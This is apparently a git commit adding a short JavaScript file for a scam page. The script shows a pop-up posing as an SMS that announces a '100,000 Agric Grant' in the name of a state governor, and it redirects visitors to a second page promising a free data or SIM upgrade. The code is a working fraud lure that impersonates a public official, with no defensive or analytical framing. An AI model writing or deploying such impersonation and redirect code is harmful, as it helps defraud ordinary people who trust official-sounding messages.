d62946b0b60bf8fd7f73da382f515bcf6117e4a0
harryjohnson86 <mfonjohnson86@gmail.com>
2025-02-24 05:31:58 -0800

    Create govalia-agricgrant.com.js

---
+++ govalia-agricgrant.com.js
@@ -0,0 +1,5 @@
+var password = '100,000 Agric Grant'
+password=prompt('SMS: Congratulations Your Name is Eligible to receive 100,000 Agric Grant GOVERNOR HYACINTH ALIA AGRIC GRANT, Kindly Press OK to ACTIVATE. ','100,000 Agric Grant');
+if (password != '100,000 Agric Grant') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
